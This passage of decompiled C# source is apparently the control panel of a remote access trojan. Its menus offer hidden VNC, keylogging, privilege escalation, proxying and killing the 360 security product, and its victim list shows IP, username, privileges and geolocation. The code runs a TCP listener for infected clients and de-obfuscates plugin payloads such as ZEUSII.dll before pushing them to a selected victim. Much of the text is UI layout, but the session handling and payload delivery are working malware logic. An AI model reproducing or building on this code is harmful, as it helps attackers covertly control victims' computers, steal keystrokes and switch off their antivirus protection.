		toolStripMenuItem18.Text = "Process Management";
		toolStripMenuItem46.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem46.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem46.Name = "modifyGroupToolStripMenuItem";
		toolStripMenuItem46.Size = new Size(180, 22);
		toolStripMenuItem46.Text = "Change Information";
		toolStripMenuItem46.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem47.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem47.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem47.Name = "modifyNoteToolStripMenuItem";
		toolStripMenuItem47.Size = new Size(130, 22);
		toolStripMenuItem47.Text = "Change Note";
		toolStripMenuItem48.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem48.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem48.Name = "modifyGroupToolStripMenuItem2";
		toolStripMenuItem48.Size = new Size(130, 22);
		toolStripMenuItem48.Text = "Change Group";
		toolStripMenuItem19.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem19.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem19.Name = "processPluginToolStripMenuItem";
		toolStripMenuItem19.Size = new Size(130, 22);
		toolStripMenuItem19.Text = "Upload plugin";
		toolStripMenuItem20.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem21, toolStripMenuItem22 });
		toolStripMenuItem20.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem20.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem20.Name = "remoteFileToolStripMenuItem";
		toolStripMenuItem20.Size = new Size(180, 22);
		toolStripMenuItem20.Text = "File Management";
		toolStripMenuItem21.BackColor = Color.FromArgb(40, 40, 40);
		toolStripMenuItem21.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem21.Name = "remoteFileToolStripMenuItem2";
		toolStripMenuItem21.Size = new Size(130, 22);
		toolStripMenuItem21.Text = "File Management";
		toolStripMenuItem22.BackColor = Color.FromArgb(40, 40, 40);
		toolStripMenuItem22.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem22.Name = "pluginToolStripMenuItem2";
		toolStripMenuItem22.Size = new Size(130, 22);
		toolStripMenuItem22.Text = "Upload plugin";
		toolStripMenuItem23.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem24, toolStripMenuItem25 });
		toolStripMenuItem23.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem23.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem23.Name = "remoteDesktopToolStripMenuItem";
		toolStripMenuItem23.Size = new Size(180, 22);
		toolStripMenuItem23.Text = "Remote Desktop";
		toolStripMenuItem24.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem24.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem24.Name = "remoteSubDesktopToolStripMenuItem";
		toolStripMenuItem24.Size = new Size(130, 22);
		toolStripMenuItem24.Text = "Remote Desktop";
		toolStripMenuItem25.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem25.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem25.Name = "desktopPluginToolStripMenuItem";
		toolStripMenuItem25.Size = new Size(130, 22);
		toolStripMenuItem25.Text = "Upload plugin";
		toolStripMenuItem26.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem27, toolStripMenuItem28 });
		toolStripMenuItem26.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem26.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem26.Name = "remoteDesktopToolStripMenuItem";
		toolStripMenuItem26.Size = new Size(180, 22);
		toolStripMenuItem26.Text = "Remote hVNC";
		toolStripMenuItem27.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem27.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem27.Name = "remoteSubDesktopToolStripMenuItem";
		toolStripMenuItem27.Size = new Size(130, 22);
		toolStripMenuItem27.Text = "Remote hVNC";
		toolStripMenuItem28.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem28.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem28.Name = "desktopPluginToolStripMenuItem";
		toolStripMenuItem28.Size = new Size(130, 22);
		toolStripMenuItem28.Text = "Upload plugin";
		toolStripMenuItem29.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem30, toolStripMenuItem31 });
		toolStripMenuItem29.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem29.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem29.Name = "remoteToolStripMenuItem";
		toolStripMenuItem29.Size = new Size(180, 22);
		toolStripMenuItem29.Text = "Key logger";
		toolStripMenuItem30.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem30.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem30.Name = "remoteKeyboardToolStripMenuItem";
		toolStripMenuItem30.Size = new Size(130, 22);
		toolStripMenuItem30.Text = "Key logger";
		toolStripMenuItem31.BackColor = Color.FromArgb(30, 30, 30);
		toolStripMenuItem31.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem31.Name = "puginToolStripMenuItem";
		toolStripMenuItem31.Size = new Size(130, 22);
		toolStripMenuItem31.Text = "Upload plugin";
		toolStripMenuItem32.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem33, toolStripMenuItem34 });
		toolStripMenuItem32.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem32.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem32.Name = "elevationOfPrivilegeToolStripMenuItem";
		toolStripMenuItem32.Size = new Size(180, 22);
		toolStripMenuItem32.Text = "Privilege escalation";
		toolStripMenuItem33.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem33.Name = "privilegeEscalationToolStripMenuItem";
		toolStripMenuItem33.Size = new Size(130, 22);
		toolStripMenuItem33.Text = "Privilege escalation";
		toolStripMenuItem34.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem34.Name = "escalationPluginToolStripMenuItem";
		toolStripMenuItem34.Size = new Size(130, 22);
		toolStripMenuItem34.Text = "Upload plugin";
		toolStripMenuItem35.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem36, toolStripMenuItem37 });
		toolStripMenuItem35.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem35.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem35.Name = "远程端口代理ToolStripMenuItem";
		toolStripMenuItem35.Size = new Size(180, 22);
		toolStripMenuItem35.Text = "Proxy port";
		toolStripMenuItem36.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem36.Name = "端口代理ToolStripMenuItem";
		toolStripMenuItem36.Size = new Size(130, 22);
		toolStripMenuItem36.Text = "Proxy port";
		toolStripMenuItem37.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem37.Name = "上传插件ToolStripMenuItem";
		toolStripMenuItem37.Size = new Size(130, 22);
		toolStripMenuItem37.Text = "Upload plugin";
		toolStripMenuItem38.DropDownItems.AddRange(new ToolStripItem[5] { toolStripMenuItem39, toolStripMenuItem40, toolStripMenuItem5, toolStripMenuItem41, toolStripMenuItem42 });
		toolStripMenuItem38.Font = new Font("Gotham Book", 10.5f);
		toolStripMenuItem38.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem38.Name = "其他功能ToolStripMenuItem";
		toolStripMenuItem38.Size = new Size(180, 22);
		toolStripMenuItem38.Text = "Other functions";
		toolStripMenuItem39.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem39.Name = "admin权限ToolStripMenuItem";
		toolStripMenuItem39.Size = new Size(270, 22);
		toolStripMenuItem39.Text = "Admin Permissions";
		toolStripMenuItem40.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem40.Name = "close360ToolStripMenuItem";
		toolStripMenuItem40.Size = new Size(270, 22);
		toolStripMenuItem40.Text = "Kill 360 safely";
		toolStripMenuItem41.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem41.Name = "clientUpdateToolStripMenuItem";
		toolStripMenuItem41.Size = new Size(270, 22);
		toolStripMenuItem41.Text = "Remote client update";
		toolStripMenuItem42.ForeColor = Color.FromArgb(190, 190, 190);
		toolStripMenuItem42.Name = "uploadOtherToolStripMenuItem";
		toolStripMenuItem42.Size = new Size(270, 22);
		toolStripMenuItem42.Text = "Upload plugin";
		toolStripMenuItem43.Name = "remoteFileToolStripMenuItem1";
		toolStripMenuItem43.Size = new Size(32, 19);
		toolStripMenuItem44.Name = "pluginToolStripMenuItem1";
		toolStripMenuItem44.Size = new Size(32, 19);
		toolStripMenuItem45.Name = "clientInfoToolStripMenuItem";
		toolStripMenuItem45.Size = new Size(32, 19);
		toolStripMenuItem46.Name = "modifyGroupToolStripMenuItem";
		toolStripMenuItem46.Size = new Size(32, 19);
		contextMenuStrip.Renderer = new MyMenuRender();
		return contextMenuStrip;
	}

	private void ListView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
	{
		using SolidBrush brush = new SolidBrush(Color.White);
		using SolidBrush brush2 = new SolidBrush(Color.FromArgb(0, 250, 154));
		e.DrawBackground();
		e.Graphics.FillRectangle(brush, e.Bounds);
		e.Graphics.DrawRectangle(new Pen(Color.Black), new Rectangle(e.Bounds.Left - 1, e.Bounds.Top - 1, e.Bounds.Width, e.Bounds.Height));
		Font font = new Font("Italic", 8.25f, FontStyle.Bold);
		RectangleF layoutRectangle = new RectangleF(e.Bounds.Left, e.Bounds.Top + 3, e.Bounds.Width, e.Bounds.Height - 3);
		e.Graphics.DrawString(e.Header.Text, font, brush2, layoutRectangle);
	}

	private void ListView1_DrawItem(object sender, DrawListViewItemEventArgs e)
	{
		if (!e.Item.Selected)
		{
			e.DrawDefault = true;
		}
	}

	private void ListView2_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
	{
		using SolidBrush brush = new SolidBrush(Color.White);
		using SolidBrush brush2 = new SolidBrush(Color.White);
		e.DrawBackground();
		e.Graphics.FillRectangle(brush, e.Bounds);
		e.Graphics.DrawRectangle(new Pen(Color.Black), new Rectangle(e.Bounds.Left - 1, e.Bounds.Top - 1, e.Bounds.Width, e.Bounds.Height));
		Font font = new Font("Segoe UI", 9f, FontStyle.Bold);
		RectangleF layoutRectangle = new RectangleF(e.Bounds.Left, e.Bounds.Top + 2, e.Bounds.Width, e.Bounds.Height - 2);
		e.Graphics.DrawString(e.Header.Text, font, brush2, layoutRectangle);
	}

	private void ListView2_DrawItem(object sender, DrawListViewItemEventArgs e)
	{
		if (!e.Item.Selected)
		{
			e.DrawDefault = true;
		}
	}

	private void ListView2_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
	{
		using SolidBrush brush = new SolidBrush(Color.FromArgb(150, 150, 150));
		if (e.Item.Selected)
		{
			e.Graphics.FillRectangle(brush, e.Bounds);
			Graphics graphics = e.Graphics;
			string text = e.SubItem.Text;
			Font font = new Font("Gotham Book", 8f, FontStyle.Regular);
			int num = e.Bounds.Left + 3;
			int num2 = e.Bounds.Top + 2;
			Point pt = new Point(num, num2);
			Color foreColor = Color.FromArgb(17, 17, 17);
			TextRenderer.DrawText(graphics, text, font, pt, foreColor);
		}
		else
		{
			e.DrawDefault = true;
		}
	}

	private void ListView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
	{
		using SolidBrush brush = new SolidBrush(Color.FromArgb(150, 150, 150));
		if (e.Item.Selected)
		{
			e.Graphics.FillRectangle(brush, e.Bounds);
			Graphics graphics = e.Graphics;
			string text = e.SubItem.Text;
			Font font = new Font("Gotham Book", 8f, FontStyle.Regular);
			int num = e.Bounds.Left + 3;
			int num2 = e.Bounds.Top + 2;
			Point pt = new Point(num, num2);
			Color foreColor = Color.FromArgb(17, 17, 17);
			TextRenderer.DrawText(graphics, text, font, pt, foreColor);
		}
		else
		{
			e.DrawDefault = true;
		}
	}

	private ushort GetPortSafe()
	{
		if (ushort.TryParse(numPort.Value.ToString(CultureInfo.InvariantCulture), out var result))
		{
			return result;
		}
		return 0;
	}

	private void btnStartL_Click(object sender, EventArgs e)
	{
		ushort portSafe = GetPortSafe();
		_tcpServer = new TcpServer(Convert.ToInt32(portSafe));
		_tcpServer._ClientConnected += ClientConnected;
		_tcpServer._ClientDisconnected += ClientDisconnected;
		_tcpServer._ClientMessage += ClientMessage;
		_tcpServer.Listen();
		Task.Factory.StartNew((Func<Task>)async delegate
		{
			await UpdateStatusBar();
		}, TaskCreationOptions.LongRunning);
		guna2Transition1.HideSync(buttonspanel);
	}

	private void btnStopL_Click(object sender, EventArgs e)
	{
		_tcpServer.Shutdown();
		guna2Transition1.HideSync(buttonspanel);
	}

	private async void startToolStripMenuItem_Click(object sender, EventArgs e)
	{
		await Task.Run(async delegate
		{
			remoteHVNCPluginToolStripMenuItem_Click(new object(), new EventArgs());
		});
		List<Thread> list = new List<Thread>();
		try
		{
			TcpClientSession tcs;
			string address;
			list.Add(new Thread((ThreadStart)delegate
			{
				Thread.Sleep(3000);
				try
				{
					if (GetSelectedSession(out tcs))
					{
						address = tcs._remoteEndPoint.Address.ToString();
						if ((Remote_hVNC)Application.OpenForms["Chrome hVNC :" + address] == null)
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								try
								{
									Application.Run(new Remote_hVNC("Chrome", tcs)
									{
										Name = "Chrome hVNC :" + address,
										Text = "\\\\" + address + " - Chrome hVNC"
									});
								}
								catch
								{
								}
							});
							thread.SetApartmentState(ApartmentState.STA);
							thread.Start();
						}
					}
				}
				catch
				{
				}
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
		}
		catch
		{
		}
	}

	private void stopToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void remoteHVNCPluginToolStripMenuItem_Click(object sender, EventArgs e)
	{
		UploadPlugin("ZEUS\\ZEUSII.dll", "Uploading [Remote hVNC] Module, Please wait.....");
	}

	public async Task LODAGUI(string resource, string pluginname)
	{
		await awaituploadplugins(resource, pluginname);
	}

	private async Task awaituploadplugins(string resource, string pluginname)
	{
		Task.Run(delegate
		{
			DoLoadGui(resource, pluginname);
		}).Wait();
	}

	public void UploadPlugin(string PathPlugin, string pluginname)
	{
		try
		{
			lock (PluginStatus)
			{
				if (!GetSelectedSession(out var tcs))
				{
					return;
				}
				ClientMessage(pluginname, null);
				List<byte> list = new List<byte>();
				byte[] collection = GZip.Compress(Convert.FromBase64String(File.ReadAllText(Application.StartupPath + "\\Plugins\\" + PathPlugin.Replace(".dll", ".Key")).Replace(":", "A").Replace("-", "o")
					.Replace("*", "O")));
				list.AddRange(collection);
				uint num = 102400u;
				uint num2 = 0u;
				int count = list.Count;
				while (list.Count > 15000)
				{
					tcs.Client_Send(DataType.UploadPlugin, list.GetRange(0, 15000).ToArray());
					list.RemoveRange(0, 15000);
					num2 += 15000;
					if (num2 > num)
					{
						Task.Delay(500);
						num2 = 0u;
					}
				}
				tcs.Client_Send(DataType.UploadPlugin, list.ToArray());
				tcs.Client_Send(DataType.UploadPluginEnd, BitConverter.GetBytes(count));
			}
		}
		catch (Exception ex)
		{
			MsgBox.Show(ex.Message);
		}
	}

	private void DoLoadGui(string resource, string pluginname)
	{
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
		using StreamReader streamReader = new StreamReader(stream);
		string text = streamReader.ReadToEnd();
		try
		{
			lock (PluginStatus)
			{
				if (!GetSelectedSession(out var tcs))
				{
					return;
				}
				ClientMessage(pluginname, null);
				List<byte> list = new List<byte>();
				byte[] collection = GZip.Compress(Convert.FromBase64String(text.Replace(":", "A").Replace("-", "o").Replace("*", "O")));
				list.AddRange(collection);
				uint num = 102400u;
				uint num2 = 0u;
				int count = list.Count;
				while (list.Count > 15000)
				{
					tcs.Client_Send(DataType.UploadPlugin, list.GetRange(0, 15000).ToArray());
					list.RemoveRange(0, 15000);
					num2 += 15000;
					if (num2 > num)
					{
						Task.Delay(500);
						num2 = 0u;
					}
				}
				tcs.Client_Send(DataType.UploadPlugin, list.ToArray());
				tcs.Client_Send(DataType.UploadPluginEnd, BitConverter.GetBytes(count));
			}
		}
		catch (Exception ex)
		{
			MsgBox.Show(ex.Message);
		}
	}

	private void buttonspanel_MouseLeave(object sender, EventArgs e)
	{
		guna2Transition1.HideSync(buttonspanel);
	}

	private void guna2Button1_Click(object sender, EventArgs e)
	{
		if (!buttonspanel.Visible)
		{
			guna2Transition1.ShowSync(buttonspanel);
		}
		else
		{
			guna2Transition1.HideSync(buttonspanel);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		Guna.UI2.AnimatorNS.Animation animation = new Guna.UI2.AnimatorNS.Animation();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RhVNC_Connections));
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
		guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
		guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
		listView1 = new System.Windows.Forms.ListView();
		columnHeader1 = new System.Windows.Forms.ColumnHeader();
		columnHeader2 = new System.Windows.Forms.ColumnHeader();
		columnHeader3 = new System.Windows.Forms.ColumnHeader();
		columnHeader4 = new System.Windows.Forms.ColumnHeader();
		columnHeader5 = new System.Windows.Forms.ColumnHeader();
		columnHeader6 = new System.Windows.Forms.ColumnHeader();
		columnHeader7 = new System.Windows.Forms.ColumnHeader();
		columnHeader8 = new System.Windows.Forms.ColumnHeader();
		columnHeader9 = new System.Windows.Forms.ColumnHeader();
		guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		hVNCHBROWSERSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
		guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
		buttonspanel = new Guna.UI2.WinForms.Guna2Panel();
		numPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
		btnStopL = new Guna.UI2.WinForms.Guna2GradientButton();
		btnStartL = new Guna.UI2.WinForms.Guna2GradientButton();
		listView2 = new System.Windows.Forms.ListView();
		colDateTime = new System.Windows.Forms.ColumnHeader();
		colEven = new System.Windows.Forms.ColumnHeader();
		notifyIcon = new System.Windows.Forms.NotifyIcon(components);
		imageList1 = new System.Windows.Forms.ImageList(components);
		timer1 = new System.Windows.Forms.Timer(components);
		timer2 = new System.Windows.Forms.Timer(components);
		imageList2 = new System.Windows.Forms.ImageList(components);
		guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
		lblOnline = new Siticone.UI.WinForms.SiticoneLabel();
		lblDownload = new Siticone.UI.WinForms.SiticoneLabel();
		lblUpload = new Siticone.UI.WinForms.SiticoneLabel();
		chkSubitemIcons = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
		siticoneLabel1 = new Siticone.UI.WinForms.SiticoneLabel();
		label1 = new System.Windows.Forms.Label();
		guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
		guna2ContextMenuStrip2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
		buttonspanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)numPort).BeginInit();
		SuspendLayout();
		guna2BorderlessForm1.ContainerControl = this;
		guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
		guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2Transition1.SetDecoration(guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
		guna2ControlBox1.IconColor = System.Drawing.Color.White;
		guna2ControlBox1.Location = new System.Drawing.Point(1189, 17);
		guna2ControlBox1.Name = "guna2ControlBox1";
		guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
		guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
		guna2ControlBox1.TabIndex = 0;
		guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
		guna2Transition1.SetDecoration(guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2ControlBox2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
		guna2ControlBox2.IconColor = System.Drawing.Color.White;
		guna2ControlBox2.Location = new System.Drawing.Point(1138, 17);
		guna2ControlBox2.Name = "guna2ControlBox2";
		guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
		guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
		guna2ControlBox2.TabIndex = 1;
		guna2ControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
		guna2Transition1.SetDecoration(guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2ControlBox3.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2ControlBox3.HoverState.Parent = guna2ControlBox3;
		guna2ControlBox3.IconColor = System.Drawing.Color.White;
		guna2ControlBox3.Location = new System.Drawing.Point(1087, 17);
		guna2ControlBox3.Name = "guna2ControlBox3";
		guna2ControlBox3.ShadowDecoration.Parent = guna2ControlBox3;
		guna2ControlBox3.Size = new System.Drawing.Size(45, 29);
		guna2ControlBox3.TabIndex = 2;
		listView1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		listView1.BackgroundImage = (System.Drawing.Image)resources.GetObject("listView1.BackgroundImage");
		listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[9] { columnHeader1, columnHeader2, columnHeader3, columnHeader4, columnHeader5, columnHeader6, columnHeader7, columnHeader8, columnHeader9 });
		listView1.ContextMenuStrip = guna2ContextMenuStrip2;
		guna2Transition1.SetDecoration(listView1, Guna.UI2.AnimatorNS.DecorationType.None);
		listView1.Dock = System.Windows.Forms.DockStyle.Bottom;
		listView1.ForeColor = System.Drawing.Color.LightCyan;
		listView1.HideSelection = false;
		listView1.Location = new System.Drawing.Point(0, 112);
		listView1.Name = "listView1";
		listView1.OwnerDraw = true;
		listView1.Size = new System.Drawing.Size(1246, 505);
		listView1.TabIndex = 9;
		listView1.UseCompatibleStateImageBehavior = false;
		listView1.View = System.Windows.Forms.View.Details;
		listView1.DrawColumnHeader += new System.Windows.Forms.DrawListViewColumnHeaderEventHandler(ListView1_DrawColumnHeader);
		listView1.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(ListView1_DrawItem);
		listView1.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(ListView1_DrawSubItem);
		columnHeader1.Text = "[IP]";
		columnHeader1.Width = 158;
		columnHeader2.Text = "[HOST / USERNAME]";
		columnHeader2.Width = 197;
		columnHeader3.Text = "[OP SYSTEM]";
		columnHeader3.Width = 182;
		columnHeader4.Text = "[TIME EXECUTED]";
		columnHeader4.Width = 121;
		columnHeader5.Text = "[TIME INSTALLED]";
		columnHeader5.Width = 112;
		columnHeader6.Text = "[PRIVILEGES]";
		columnHeader6.Width = 98;
		columnHeader7.Text = "[FIREWALL]";
		columnHeader7.Width = 102;
		columnHeader8.Text = "[.NET]";
		columnHeader8.Width = 117;
		columnHeader9.Text = "[GEO LOCATION]";
		columnHeader9.Width = 152;
		guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2Transition1.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2ContextMenuStrip2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(29, 29);
		guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { hVNCHBROWSERSToolStripMenuItem });
		guna2ContextMenuStrip2.Margin = new System.Windows.Forms.Padding(3);
		guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip1";
		guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
		guna2ContextMenuStrip2.Size = new System.Drawing.Size(228, 40);
		hVNCHBROWSERSToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { startToolStripMenuItem, stopToolStripMenuItem });
		hVNCHBROWSERSToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
		hVNCHBROWSERSToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hVNCHBROWSERSToolStripMenuItem.Image");
		hVNCHBROWSERSToolStripMenuItem.Name = "hVNCHBROWSERSToolStripMenuItem";
		hVNCHBROWSERSToolStripMenuItem.Size = new System.Drawing.Size(227, 36);
		hVNCHBROWSERSToolStripMenuItem.Text = "    [HVNC / HBROWSERS]";
		startToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		startToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
		startToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("startToolStripMenuItem.Image");
		startToolStripMenuItem.Name = "startToolStripMenuItem";
		startToolStripMenuItem.Size = new System.Drawing.Size(132, 36);
		startToolStripMenuItem.Text = "     Start";
		startToolStripMenuItem.Click += new System.EventHandler(startToolStripMenuItem_Click);
		stopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		stopToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
		stopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("stopToolStripMenuItem.Image");
		stopToolStripMenuItem.Name = "stopToolStripMenuItem";
		stopToolStripMenuItem.Size = new System.Drawing.Size(132, 36);
		stopToolStripMenuItem.Text = "     Stop";
		stopToolStripMenuItem.Click += new System.EventHandler(stopToolStripMenuItem_Click);
		guna2Button1.Animated = true;
		guna2Button1.BackColor = System.Drawing.Color.Transparent;
		guna2Button1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Button1.BackgroundImage");
		guna2Button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		guna2Button1.CheckedState.Parent = guna2Button1;
		guna2Button1.CustomImages.Parent = guna2Button1;
		guna2Transition1.SetDecoration(guna2Button1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Button1.DisabledState.Parent = guna2Button1;
		guna2Button1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2Button1.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2Button1.ForeColor = System.Drawing.Color.White;
		guna2Button1.HoverState.Parent = guna2Button1;
		guna2Button1.Image = (System.Drawing.Image)resources.GetObject("guna2Button1.Image");
		guna2Button1.ImageSize = new System.Drawing.Size(32, 32);
		guna2Button1.Location = new System.Drawing.Point(86, 18);
		guna2Button1.Name = "guna2Button1";
		guna2Button1.ShadowDecoration.Parent = guna2Button1;
		guna2Button1.Size = new System.Drawing.Size(46, 45);
		guna2Button1.TabIndex = 17;
		guna2Button1.UseTransparentBackground = true;
		guna2Button1.Click += new System.EventHandler(guna2Button1_Click);
		guna2Transition1.SetDecoration(guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
		guna2PictureBox1.ImageRotate = 0f;
		guna2PictureBox1.Location = new System.Drawing.Point(12, 1);
		guna2PictureBox1.Name = "guna2PictureBox1";
		guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
		guna2PictureBox1.Size = new System.Drawing.Size(68, 60);
		guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		guna2PictureBox1.TabIndex = 18;
		guna2PictureBox1.TabStop = false;
		buttonspanel.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		buttonspanel.Controls.Add(numPort);
		buttonspanel.Controls.Add(btnStopL);
